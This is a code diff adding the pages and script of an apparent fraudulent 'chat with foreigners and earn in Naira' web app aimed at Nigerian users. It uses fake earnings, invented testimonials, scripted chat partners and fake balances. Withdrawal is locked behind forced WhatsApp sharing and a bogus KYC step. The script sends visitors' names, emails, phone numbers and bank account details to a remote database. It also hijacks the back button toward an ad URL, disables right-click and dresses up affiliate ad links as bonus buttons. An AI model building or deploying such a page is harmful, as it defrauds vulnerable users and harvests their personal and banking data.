+  <div class="land-hero">
+    <div class="land-avatars">
+      <div class="land-av">🇺🇸</div>
+      <div class="land-av">🇬🇧</div>
+      <div class="land-av">🇨🇦</div>
+      <div class="land-av">🇩🇪</div>
+      <div class="land-av">🇦🇺</div>
+      <div class="land-av-count">+2K</div>
+    </div>
+
+    <div class="land-title">Chat With <em>Foreigners</em><br>& Earn in Naira</div>
+    <p class="land-sub">Nigerians are earning <strong>₦30,000–₦50,000 daily</strong> just by chatting with foreigners in their language. Join now — it's free.</p>
+
+    <div class="earn-rates">
+      <div class="er-title">EARNINGS PER REPLY</div>
+      <div class="er-row">
+        <div class="er-left"><span class="er-flag">🇺🇸</span><span class="er-lang">American English</span></div>
+        <div class="er-rate">₦15,000/reply</div>
+      </div>
+      <div class="er-row">
+        <div class="er-left"><span class="er-flag">🇬🇧</span><span class="er-lang">British English</span></div>
+        <div class="er-rate">₦12,000/reply</div>
+      </div>
+      <div class="er-row">
+        <div class="er-left"><span class="er-flag">🇨🇦</span><span class="er-lang">Canadian English</span></div>
+        <div class="er-rate">₦10,000/reply</div>
+      </div>
+      <div class="er-row">
+        <div class="er-left"><span class="er-flag">🇳🇬</span><span class="er-lang">Pidgin English</span></div>
+        <div class="er-rate">₦8,000/reply</div>
+      </div>
+    </div>
+
+    <!-- LIVE PAYOUT COUNTER -->
+    <div class="live-counter">
+      <div class="lc-left">
+        <div class="lc-dot"></div>
+        <div class="lc-label">Total paid to Nigerians today</div>
+      </div>
+      <div class="lc-amount" id="liveCounter">₦0</div>
+    </div>
+
+    <button class="btn-start" onclick="goScreen('register')">🚀 Start Earning Now — Free</button>
+
+    <div class="land-trust">
+      <div class="lt-item">✅ Free to join</div>
+      <div class="lt-item">💰 Instant earnings</div>
+      <div class="lt-item">🔒 Secure</div>
+    </div>
+
+    <!-- TESTIMONIALS -->
+    <div class="testimonials" style="margin-top:28px;">
+      <div class="testi-title">WHAT NIGERIANS ARE SAYING</div>
+      <div class="testi-card">
+        <div class="tc-top">
+          <div class="tc-av" style="background:#FF6B35;">AO</div>
+          <div><div class="tc-name">Adaeze Obi</div><div class="tc-loc">📍 Lagos</div></div>
+        </div>
+        <div class="tc-stars">★★★★★</div>
+        <div class="tc-text">"I didn't believe it at first. But after chatting for 30 minutes I saw ₦45,000 in my balance. Withdrew to OPay same day."</div>
+        <div class="tc-earned">Earned: ₦45,000 💰</div>
+      </div>
+      <div class="testi-card">
+        <div class="tc-top">
+          <div class="tc-av" style="background:#2979FF;">EM</div>
+          <div><div class="tc-name">Emeka Madu</div><div class="tc-loc">📍 Abuja</div></div>
+        </div>
+        <div class="tc-stars">★★★★★</div>
+        <div class="tc-text">"Best discovery of 2024. I chat with the American users every morning before work and make more than my salary. Join now before they close slots."</div>
+        <div class="tc-earned">Earned: ₦62,000 💰</div>
+      </div>
+      <div class="testi-card">
+        <div class="tc-top">
+          <div class="tc-av" style="background:#AA00FF;">FB</div>
+          <div><div class="tc-name">Fatima Bello</div><div class="tc-loc">📍 Kano</div></div>
+        </div>
+        <div class="tc-stars">★★★★★</div>
+        <div class="tc-text">"As a student this has been life changing. I earn ₦40,000+ every week chatting with foreigners on my phone. No laptop needed."</div>
+        <div class="tc-earned">Earned: ₦38,500 💰</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- ══ REGISTER ══ -->
+<div id="register" class="screen">
+  <div class="reg-header">
+    <div class="reg-back" onclick="goScreen('landing')">←</div>
+    <div class="reg-title">Create Free Account</div>
+  </div>
+  <div class="reg-body">
+    <div class="reg-hero">
+      <span class="reg-hero-icon">🎉</span>
+      <h2>Get ₦10,000 Sign-Up Bonus</h2>
+      <p>Register now and receive ₦10,000 instantly credited to your account</p>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Full Name</label>
+      <input class="form-input" id="regName" type="text" placeholder="Enter your full name">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Email Address</label>
+      <input class="form-input" id="regEmail" type="email" placeholder="Enter your email">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Phone Number (WhatsApp)</label>
+      <input class="form-input" id="regPhone" type="tel" placeholder="e.g. 08012345678" maxlength="14">
+    </div>
+    <div class="form-group">
+      <label class="form-label">Password</label>
+      <input class="form-input" id="regPass" type="password" placeholder="Create a password">
+    </div>
+
+    <div class="terms-row">
+      <div class="terms-cb">✓</div>
+      <div class="terms-txt">I agree to the <span>Terms of Service</span> and <span>Privacy Policy</span>. I understand earnings are paid via Opay/Palmpay.</div>
+    </div>
+
+    <button class="btn-register" onclick="doRegister()">Create Account & Get ₦10,000 →</button>
+    <div class="reg-login">Already have an account? <span>Log In</span></div>
+  </div>
+</div>
+
+<!-- ══ LOADING ══ -->
+<div id="loading" class="screen">
+  <div class="ld-icon">🎉</div>
+  <div class="ld-title" id="ldTitle">Setting Up Your Account</div>
+  <p class="ld-sub" id="ldSub">Please wait while we match you with foreigners...</p>
+  <div class="ld-bar"><div class="ld-fill" id="ldFill"></div></div>
+  <div class="ld-steps" id="ldSteps">
+    <div class="ld-step" id="ls1"><div class="ld-step-dot"></div>Creating your profile...</div>
+    <div class="ld-step" id="ls2"><div class="ld-step-dot"></div>Adding ₦10,000 sign-up bonus...</div>
+    <div class="ld-step" id="ls3"><div class="ld-step-dot"></div>Matching you with foreigners...</div>
+    <div class="ld-step" id="ls4"><div class="ld-step-dot"></div>Setting up your wallet...</div>
+  </div>
+</div>
+
+<!-- ══ DASHBOARD ══ -->
+<div id="dashboard" class="screen">
+  <div class="dash-header">
+    <div class="dh-left">
+      <div class="dh-av">😊</div>
+      <div>
+        <div class="dh-name" id="dashName">Welcome!</div>
+        <div class="dh-status">🟢 Online — Ready to earn</div>
+      </div>
+    </div>
+    <div class="dh-earn">
+      <div class="dh-earn-lbl">BALANCE</div>
+      <div class="dh-earn-val" id="dashBalance">₦10,000</div>
+    </div>
+  </div>
+
+  <div class="bonus-banner">
+    <div class="bb-icon">🎁</div>
+    <div class="bb-body">
+      <div class="bb-title">Sign-Up Bonus Received!</div>
+      <div class="bb-sub">Start chatting to earn more</div>
+    </div>
+    <div class="bb-amount">₦10,000</div>
+  </div>
+
+  <div style="padding:0 16px 12px;">
+    <div class="section-title">
+      <span class="st-label">Chat With Foreigners</span>
+      <span class="st-badge">2,847 Online</span>
+    </div>
+  </div>
+
+  <div class="foreigner-list" id="foreignerList">
+    <div class="foreigner-card" onclick="openChat(0)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#1565C0,#42A5F5);">AL<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">alexlab102</div>
+        <div class="fc-country">🇺🇸 United States · American English</div>
+      </div>
+      <button class="fc-earn">₦15K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(1)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#880E4F,#F06292);">EC<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">EmiliaCute</div>
+        <div class="fc-country">🇬🇧 United Kingdom · British English</div>
+      </div>
+      <button class="fc-earn">₦12K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(2)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#1B5E20,#66BB6A);">MJ<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">MattJohn</div>
+        <div class="fc-country">🇨🇦 Canada · Canadian English</div>
+      </div>
+      <button class="fc-earn">₦10K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(3)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#E65100,#FFA726);">AB<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">Abi1990</div>
+        <div class="fc-country">🇺🇸 United States · American English</div>
+      </div>
+      <button class="fc-earn">₦15K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(4)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#4A148C,#CE93D8);">PR<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">princess77</div>
+        <div class="fc-country">🇩🇪 Germany · European English</div>
+      </div>
+      <button class="fc-earn">₦8K/reply</button>
+    </div>
+    <div class="foreigner-card" onclick="openChat(5)">
+      <div class="fc-av-circle" style="background:linear-gradient(135deg,#006064,#4DD0E1);">CA<div class="fc-online"></div></div>
+      <div class="fc-body">
+        <div class="fc-name">CamilaAnders</div>
+        <div class="fc-country">🇦🇺 Australia · Australian English</div>
+      </div>
+      <button class="fc-earn">₦10K/reply</button>
+    </div>
+  </div>
+
+  <div class="withdraw-teaser" style="margin-top:16px;">
+    <div class="wt-left">
+      <div class="wt-icon">💳</div>
+      <div class="wt-body">
+        <div class="wt-title">Withdrawal</div>
+        <div class="wt-sub" id="wdTeaserSub">Minimum: ₦40,000 — Chat to unlock</div>
+      </div>
+    </div>
+    <button class="wt-btn" id="wdTeaserBtn" onclick="tryWithdraw()">Locked 🔒</button>
+  </div>
+
+  <div style="height:20px;"></div>
+
+  <!-- TRAFFIC LINKS — Dashboard bottom -->
+  <div style="padding:0 16px 6px;">
+    <a href="//rm358.com/4/11254711?var={your_source_id}" target="_blank" onclick="return trackClick('dash_ad1')" style="display:flex;align-items:center;justify-content:space-between;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 16px;text-decoration:none;margin-bottom:10px;">
+      <div style="display:flex;align-items:center;gap:10px;">
+        <span style="font-size:24px;">🎁</span>
+        <div>
+          <div style="font-size:14px;font-weight:700;color:var(--w);">Claim Today's Bonus Offer</div>
+          <div style="font-size:11px;color:var(--text);">Exclusive reward for active users</div>
+        </div>
+      </div>
+      <span style="font-size:13px;font-weight:800;color:var(--green);">Claim →</span>
+    </a>
+    <a href="//rm358.com/4/11254711?var={your_source_id}" target="_blank" onclick="return trackClick('dash_ad2')" style="display:flex;align-items:center;justify-content:space-between;background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.2);border-radius:14px;padding:14px 16px;text-decoration:none;margin-bottom:10px;">
+      <div style="display:flex;align-items:center;gap:10px;">
+        <span style="font-size:24px;">💳</span>
+        <div>
+          <div style="font-size:14px;font-weight:700;color:var(--w);">Boost Your Earnings Today</div>
+          <div style="font-size:11px;color:var(--text);">Complete one task to earn extra ₦5,000</div>
+        </div>
+      </div>
+      <span style="font-size:13px;font-weight:800;color:var(--green);">Open →</span>
+    </a>
+    <a href="//rm358.com/4/11254711?var={your_source_id}" target="_blank" onclick="return trackClick('dash_ad3')" style="display:flex;align-items:center;justify-content:space-between;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 16px;text-decoration:none;">
+      <div style="display:flex;align-items:center;gap:10px;">
+        <span style="font-size:24px;">📊</span>
+        <div>
+          <div style="font-size:14px;font-weight:700;color:var(--w);">View Earnings Report</div>
+          <div style="font-size:11px;color:var(--text);">See your full earnings breakdown</div>
+        </div>
+      </div>
+      <span style="font-size:13px;font-weight:800;color:var(--green);">View →</span>
+    </a>
+  </div>
+  <div style="height:20px;"></div>
+</div>
+
+<!-- ══ CHAT ══ -->
+<div id="chat" class="screen">
+  <div class="chat-header">
+    <div class="ch-back" onclick="goScreen('dashboard')">←</div>
+    <div class="ch-av" id="chatAv">🇺🇸<div class="ch-online"></div></div>
+    <div class="ch-info">
+      <div class="ch-name" id="chatName">alexlab102</div>
+      <div class="ch-status" id="chatStatus">🟢 Online now</div>
+    </div>
+    <div class="ch-earn-badge" id="chatEarnBadge">+₦15K/reply</div>
+  </div>
+
+  <div class="chat-body" id="chatBody" style="padding-bottom:80px;">
+  </div>
+
+  <div class="chat-input-wrap">
+    <input class="chat-input" id="chatInput" placeholder="Type a message..." onkeypress="handleEnter(event)">
+    <button class="btn-send" onclick="sendMsg()">➤</button>
+  </div>
+</div>
+
+<!-- ══ EARNINGS PAGE ══ -->
+<div id="earnings" class="screen">
+  <div class="earn-header">
+    <h2>💰 My Earnings</h2>
+  </div>
+
+  <div class="earn-balance-card">
+    <div class="ebc-lbl">Total Balance</div>
+    <div>
+      <span class="ebc-currency">₦</span>
+      <span class="ebc-amount" id="earnPageAmount">40,000</span>
+    </div>
+    <div class="ebc-sub">Available for withdrawal</div>
+  </div>
+
+  <div class="earn-breakdown">
+    <div class="eb-hd">EARNINGS BREAKDOWN</div>
+    <div class="eb-row"><span class="eb-key">Sign-up Bonus</span><span class="eb-val">₦10,000</span></div>
+    <div class="eb-row"><span class="eb-key">Chat Earnings</span><span class="eb-val" id="chatEarnBreakdown">₦30,000</span></div>
+    <div class="eb-row"><span class="eb-key">Total Earned</span><span class="eb-val" id="totalEarnBreakdown">₦40,000</span></div>
+  </div>
+
+  <div style="padding:0 16px 20px;">
+    <button class="btn-withdraw" onclick="goScreen('withdraw')">💳 Withdraw My Earnings →</button>
+    <a href="https://www.effectivecpmnetwork.com/t7jwkt8bc4?key=1d77add4feba7fc9852d1b354879b329" target="_blank" style="display:block;width:100%;padding:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;font-size:14px;font-weight:700;color:var(--text);text-align:center;text-decoration:none;margin-top:10px;">📊 View Full Earnings Report →</a>
+    <a href="https://www.effectivecpmnetwork.com/trxz4e2k9?key=e5fca8368b788c42dc7608d035de37f0" target="_blank" onclick="return trackClick('earn_ad1')" style="display:block;width:100%;padding:14px;background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.2);border-radius:14px;font-size:14px;font-weight:700;color:var(--green);text-align:center;text-decoration:none;margin-top:10px;">🎁 Unlock Extra Bonus — Tap Here →</a>
+    <a href="https://www.effectivecpmnetwork.com/trxz4e2k9?key=e5fca8368b788c42dc7608d035de37f0" target="_blank" onclick="return trackClick('earn_ad2')" style="display:block;width:100%;padding:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;font-size:14px;font-weight:700;color:var(--text);text-align:center;text-decoration:none;margin-top:10px;">💰 Verify Account for Faster Payout →</a>
+  </div>
+</div>
+
+<!-- ══ WITHDRAW ══ -->
+<div id="withdraw" class="screen">
+  <div class="wd-header">
+    <div class="reg-back" onclick="goScreen('earnings')">←</div>
+    <div class="reg-title">Withdraw Earnings</div>
+  </div>
+  <div class="wd-body">
+    <div class="wd-amount-display">
+      <div class="wad-lbl">Amount to Withdraw</div>
+      <div class="wad-amount" id="wdAmount">₦40,000</div>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Select Bank</label>
+      <div class="bank-options">
+        <div class="bank-option selected" id="bankOpay" onclick="selectBank('opay')">
+          <div class="bo-name" style="font-size:18px;font-weight:900;letter-spacing:1px;">OPay</div>
+          <div style="font-size:11px;color:var(--text);margin-top:3px;">Mobile Bank</div>
+        </div>
+        <div class="bank-option" id="bankPalmpay" onclick="selectBank('palmpay')">
+          <div class="bo-name" style="font-size:18px;font-weight:900;letter-spacing:1px;">PalmPay</div>
+          <div style="font-size:11px;color:var(--text);margin-top:3px;">Mobile Bank</div>
+        </div>
+      </div>
+    </div>
+
+    <div class="form-group">
+      <label class="form-label">Account Number</label>
+      <input class="form-input" id="wdAccNo" type="number" placeholder="Enter 10-digit account number" oninput="triggerBankVerify(this.value)">
+    </div>
+    <div id="bankVerifyStatus" style="display:none;margin-top:-8px;margin-bottom:12px;padding:10px 14px;border-radius:10px;font-size:13px;font-weight:700;"></div>
+    <div class="form-group">
+      <label class="form-label">Account Name</label>
+      <input class="form-input" id="wdAccName" type="text" placeholder="Enter your account name">
+    </div>
+
+    <div style="background:rgba(0,200,83,.08);border:1px solid rgba(0,200,83,.2);border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:12px;color:#69F0AE;line-height:1.6;">
+      🔒 <strong>Secure withdrawal.</strong> Your bank details are encrypted. Payment processed within 24 hours after verification.
+    </div>
+
+    <button class="btn-place-wd" onclick="placeWithdrawal()">Place Withdrawal Request →</button>
+  </div>
+</div>
+
+<!-- ══ SHARE WALL ══ -->
+<div id="sharewall" class="screen">
+  <div style="background:var(--card);padding:16px 20px;border-bottom:1px solid var(--line);">
+    <h2 style="font-size:18px;font-weight:800;">Almost Done!</h2>
+  </div>
+  <div class="sw-body">
+    <div class="sw-hero">
+      <span class="sw-hero-icon">🔐</span>
+      <h2 id="swHeroTitle">Verify Your Account</h2>
+      <p id="swHeroSub">To process your withdrawal, share ChatEarn with <strong>5 Nigerian friends</strong> to verify your account. This prevents fraud and protects your earnings.</p>
+    </div>
+
+    <div class="sw-progress">
+      <div class="swp-top">
+        <span class="swp-lbl">Verification Progress</span>
+        <span class="swp-pct" id="swPct">0%</span>
+      </div>
+      <div class="swp-track"><div class="swp-fill" id="swFill"></div></div>
+      <div class="swp-status" id="swStatus">Share with 5 friends to unlock your withdrawal</div>
+    </div>
+
+    <div style="background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.2);border-radius:10px;padding:12px 14px;margin-bottom:16px;font-size:12px;color:var(--gold);line-height:1.6;">
+      ⚡ <strong>Your ₦40,000 is waiting.</strong> Complete verification to receive payment within 24 hours.
+    </div>
+
+    <button class="btn-share-wa" id="btnShareWA" onclick="doShareWA()">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="white"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413z"/></svg>
+      <span id="swBtnText">Share on WhatsApp to Verify</span>
+    </button>
+
+    <p class="sw-note">// Each share verifies your account with one Nigerian //</p>
+  </div>
+</div>
+
+<!-- ══ KYC ══ -->
+<div id="kyc" class="screen">
+  <div style="background:var(--card);padding:16px 20px;border-bottom:1px solid var(--line);">
+    <h2 style="font-size:18px;font-weight:800;">KYC Verification</h2>
+  </div>
+  <div class="kyc-body">
+    <div class="kyc-hero">
+      <span class="kyc-hero-icon">🛡️</span>
+      <h2>Complete KYC to Receive Payment</h2>
+      <p>Last step — complete your Know Your Customer verification to process your ₦40,000 payment. This is required by our payment partner.</p>
+    </div>
+
+    <div class="kyc-steps">
+      <div class="kyc-step">
+        <div class="ks-num">✓</div>
+        <div class="ks-body">
+          <div class="ks-title">Account Registration</div>
+          <div class="ks-sub">Profile created and verified</div>
+        </div>
+        <div class="ks-status">Done ✓</div>
+      </div>
+      <div class="kyc-step">
+        <div class="ks-num">✓</div>
+        <div class="ks-body">
+          <div class="ks-title">Chat Verification</div>
+          <div class="ks-sub">Earnings confirmed</div>
+        </div>
+        <div class="ks-status">Done ✓</div>
+      </div>
+      <div class="kyc-step">
+        <div class="ks-num">✓</div>
+        <div class="ks-body">
+          <div class="ks-title">Account Sharing</div>
+          <div class="ks-sub">Identity shared and confirmed</div>
+        </div>
+        <div class="ks-status">Done ✓</div>
+      </div>
+      <div class="kyc-step">
+        <div class="ks-num" style="background:var(--gold);color:#000;">4</div>
+        <div class="ks-body">
+          <div class="ks-title">Final KYC Verification</div>
+          <div class="ks-sub">Complete with our payment partner</div>
+        </div>
+        <div class="ks-status" style="color:var(--gold);">Pending →</div>
+      </div>
+    </div>
+
+    <div style="background:rgba(255,215,0,.08);border:1px solid rgba(255,215,0,.2);border-radius:10px;padding:12px 14px;margin-bottom:20px;font-size:12px;color:var(--gold);line-height:1.6;">
+      ⚡ <strong>Your ₦40,000 is ready.</strong> Tap below to complete your final KYC step with our payment partner. Takes less than 30 seconds.
+    </div>
+
+    <button class="btn-complete-kyc" onclick="doKYC()">🔓 Complete KYC & Receive ₦40,000 →</button>
+  </div>
+</div>
+
+<!-- ══ PROCESSING ══ -->
+<div id="processing" class="screen" style="display:none;">
+  <div class="pp-spinner"></div>
+  <div class="pp-title">Payment Processing 💰</div>
+  <p class="pp-sub">Your <strong id="ppAmount">₦40,000</strong> withdrawal has been submitted. Payment will arrive in your <strong id="ppBank">OPay</strong> account within 24 hours.</p>
+  <div class="pp-ref">REF: <span id="ppRef">——</span></div>
+  <p style="font-size:12px;color:var(--muted);margin-bottom:20px;" id="ppBankNote">Your account will receive payment within 24 hours.</p>
+
+  <div class="pp-timeline">
+    <div class="pt-item">
+      <div class="pt-dot"></div>
+      <div class="pt-body">
+        <div class="pt-title">Withdrawal Request Submitted ✓</div>
+        <div class="pt-sub">Just now</div>
+      </div>
+    </div>
+    <div class="pt-item">
+      <div class="pt-dot" style="background:var(--gold);"></div>
+      <div class="pt-body">
+        <div class="pt-title">KYC Verification — In Progress</div>
+        <div class="pt-sub">Usually takes 1–2 hours</div>
+      </div>
+    </div>
+    <div class="pt-item">
+      <div class="pt-dot" style="background:var(--muted);"></div>
+      <div class="pt-body">
+        <div class="pt-title">Payment Sent to Your Account</div>
+        <div class="pt-sub">Within 24 hours</div>
+      </div>
+    </div>
+  </div>
+
+  <p class="pp-note">Share ChatEarn with more friends to earn more while you wait!</p>
+
+  <div style="margin-top:20px;width:100%;padding:0 20px;">
+    <button style="width:100%;padding:16px;background:var(--wa);color:#fff;border:none;border-radius:14px;font-size:16px;font-weight:800;cursor:pointer;" onclick="shareAgain()">📲 Share & Earn More While Waiting</button>
+  </div>
+</div>
+
+</div><!-- page-wrap -->
+
+<script>
+// Supabase client for collecting registrations & withdrawals
+const supabaseClient = supabase.createClient(
+  "https://dtjxcgzpwemdgdeinkcl.supabase.co",
+  "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImR0anhjZ3pwd2VtZGdkZWlua2NsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Nzc5MDg0ODQsImV4cCI6MjA5MzQ4NDQ4NH0.kGjtOZfK7onzr-3FVMuSljiJ3emllxtGdepxrFVUPPM"
+);
+
+async function saveRegistration(name, email, phone){
+  try {
+    await supabaseClient.from('chatearn_users').insert([{
+      full_name: name,
+      email: email,
+      phone: phone || '',
+      balance: 10000,
+      status: 'active',
+      registered_at: new Date().toISOString()
+    }]);
+  } catch(e){ console.log('Registration save failed:', e); }
+}
+
+async function saveWithdrawal(name, accNo, bank, amount){
+  try{
+    const userEmail = document.getElementById('regEmail')?.value.trim() || '';
+    const userFullName = document.getElementById('regName')?.value.trim() || userName || '';
+    await supabaseClient.from('chatearn_withdrawals').insert([{
+      account_name: name,
+      account_number: accNo,
+      bank: bank,
+      amount: amount,
+      user_email: userEmail,
+      user_full_name: userFullName,
+      status: 'pending',
+      requested_at: new Date().toISOString()
+    }]);
+  }catch(e){ console.log('Withdrawal save failed:', e); }
+}
+
+const SITE = "https://chat-earn.xyz";
+const AFF = "https://www.effectivecpmnetwork.com/t7jwkt8bc4?key=1d77add4feba7fc9852d1b354879b329";
+const BACK = "https://omg10.com/4/4105256";
+const REQ = 5;
+
+document.querySelectorAll(".screen").forEach(s=>{s.style.display="none";});
+document.getElementById("landing").style.display="block";
+document.getElementById("landing").classList.add("active");
+
+(function(){
+  history.pushState(null,"",location.href);
+  history.pushState(null,"",location.href);
+  history.pushState(null,"",location.href);
+  window.addEventListener("popstate",function(){
+    history.pushState(null,"",location.href);
+    if(currentScreen==='landing'||currentScreen==='register'){
+      window.location.href=BACK;
+    } else {
+      showBackWarn();
+    }
+  });
+})();
+
+document.addEventListener("contextmenu",e=>e.preventDefault());
+
+function showBackWarn(){
+  document.getElementById("bwAmount").textContent="₦"+totalBalance.toLocaleString("en-NG");
+  document.getElementById("backWarn").classList.add("show");
+}
+function closeBackWarn(){document.getElementById("backWarn").classList.remove("show");}
+
+let userName="",totalBalance=10000,chatEarnings=0,replyCount=0,currentChatUser=null,currentScreen="landing";
+let swShares=0,selectedBank="opay",chatBusy=false,withdrawPrompted=false;
+let withdrawalAmount=0,withdrawalBank="opay",withdrawalAcc="",chatHistory=[],shareFailTriggered=false;
+const MIN_WITHDRAW=40000,MAX_EARN=65000;
+
+// ══ SESSION PERSISTENCE ══
+// Without this, every reload wipes progress — nothing to "come back" to.
+const STATE_KEY="chatearn_state_v1";
+let checkinStreak=0,lastCheckinDate="";
+
+function saveState(){
+  try{
+    localStorage.setItem(STATE_KEY, JSON.stringify({
+      userName, totalBalance, chatEarnings, replyCount, checkinStreak, lastCheckinDate
+    }));
+  }catch(e){}
+}
+
+function loadState(){
+  try{
+    const raw=localStorage.getItem(STATE_KEY);
+    if(!raw) return false;
+    const s=JSON.parse(raw);
+    userName=s.userName||"";
+    totalBalance=typeof s.totalBalance==="number"?s.totalBalance:10000;
+    chatEarnings=s.chatEarnings||0;
+    replyCount=s.replyCount||0;
+    checkinStreak=s.checkinStreak||0;
+    lastCheckinDate=s.lastCheckinDate||"";
+    return !!userName;
+  }catch(e){ return false; }
+}
+
+function tryRestoreSession(){
+  if(loadState()){
+    goScreen("dashboard");
+    document.getElementById("dashName").textContent=userName+"!";
+    document.getElementById("dashBalance").textContent="₦"+totalBalance.toLocaleString("en-NG");
+    setTimeout(runDailyCheckin,1200);
+    return true;
+  }
+  return false;
+}
+
+// ══ DAILY STREAK / CHECK-IN ══
+// Day 1 = signup day (no modal, the signup bonus already covers it).
+// Miss a day → streak resets to 1, but balance is never touched. Streak is a bonus system, not a punishment system.
+const STREAK_REWARDS=[200,300,500,700,1000,1300,2000]; // escalates Day1→Day7, then repeats the cycle
+
+function runDailyCheckin(){
+  const today=new Date().toDateString();
+  if(lastCheckinDate===today) return; // already checked in today
+  const yesterday=new Date(Date.now()-86400000).toDateString();
+  checkinStreak=(lastCheckinDate===yesterday)?checkinStreak+1:1;
+  lastCheckinDate=today;
+  saveState();
+  showStreakModal();
+}
+
+function showStreakModal(){
+  const dayIdx=(checkinStreak-1)%STREAK_REWARDS.length;
+  const reward=STREAK_REWARDS[dayIdx];
+  document.getElementById("streakTitle").textContent="Day "+checkinStreak+" Streak!";
+  document.getElementById("streakSub").textContent=checkinStreak>=7?"You're on fire! Keep coming back daily.":"Come back tomorrow to keep it going";
+  document.getElementById("streakReward").textContent="₦"+reward.toLocaleString("en-NG");
+  const daysEl=document.getElementById("streakDays");
+  daysEl.innerHTML=STREAK_REWARDS.map(function(r,i){
+    const day=i+1, filled=day<=(((checkinStreak-1)%7)+1);
+    return '<div style="width:34px;height:34px;border-radius:10px;background:'+(filled?'var(--green)':'var(--card2)')+';color:'+(filled?'#000':'var(--muted)')+';display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:800;">'+day+'</div>';
+  }).join("");
+  document.getElementById("streakModal").style.display="flex";
+}
+
+function claimStreak(){
+  const dayIdx=(checkinStreak-1)%STREAK_REWARDS.length;
+  const reward=STREAK_REWARDS[dayIdx];
+  totalBalance+=reward;
+  saveState();
+  document.getElementById("dashBalance").textContent="₦"+totalBalance.toLocaleString("en-NG");
+  document.getElementById("streakModal").style.display="none";
+  showEarnToast("+₦"+reward.toLocaleString("en-NG")+" streak bonus! 🔥");
+}
+
+const FOREIGNERS=[
+  {
+    name:"alexlab102", flag:"🇺🇸", initials:"AL",
+    color:"linear-gradient(135deg,#1565C0,#42A5F5)",
+    country:"United States", rate:15000,
+    msgs:[
+      "Hey! 👋 I just got matched with you on here. I'm Alex, from Houston Texas. What's up?",
+      "Oh nice nice! I've been wanting to chat with someone from Nigeria for a while now 😄 Which part are you from?",
+      "Bro Lagos?? I've watched so many videos about Lagos on YouTube lol. The energy there looks CRAZY 🔥 Is it really like that?",
+      "Haha I knew it! My friend went to Lagos last year and said it changed his life fr 😂 Do you go out a lot or more stay home?",
+      "That's wild man. In Houston it's more chill... drive everywhere, no hustle like that. What kind of music you listen to?",
+      "Bro Burna Boy is literally on my playlist every day 😭🙌 He's huge here in the US right now. Have you ever been to one of his concerts?",
+      "That's so cool honestly. I wish I could experience that. Do you think Nigeria will ever be as big globally as people say it will?",
+      "100% I believe that too. The culture, the music, the tech scene... Nigeria is moving 💪 What do you do for work if you don't mind me asking?",
+      "That's dope! Respect the hustle. Over here I work in logistics, it's decent but I want to do something more digital like what Nigerians are doing 😂",
+      "Facts. Honestly chatting with you is making me want to visit Nigeria soon. What time is it over there right now? 😄",
+    ]
+  },
+  {
+    name:"EmiliaCute", flag:"🇬🇧", initials:"EC",
+    color:"linear-gradient(135deg,#880E4F,#F06292)",
+    country:"United Kingdom", rate:12000,
+    msgs:[
+      "Hellooo 😊 I just got matched with you! I'm Emilia, from London. How are you doing today?",
+      "Aww that's lovely to hear! I've been speaking to a few Nigerians on here and honestly you lot are so friendly 😄 Where in Nigeria are you?",
+      "Oh I love that! My colleague at work is from Abuja and she always talks about how beautiful it is there. Is the weather nice this time of year?",
+      "Haha yes! I always complain about London weather 😂 It's been grey and rainy for like 3 weeks straight. I'm so jealous of you guys and your sunshine honestly.",
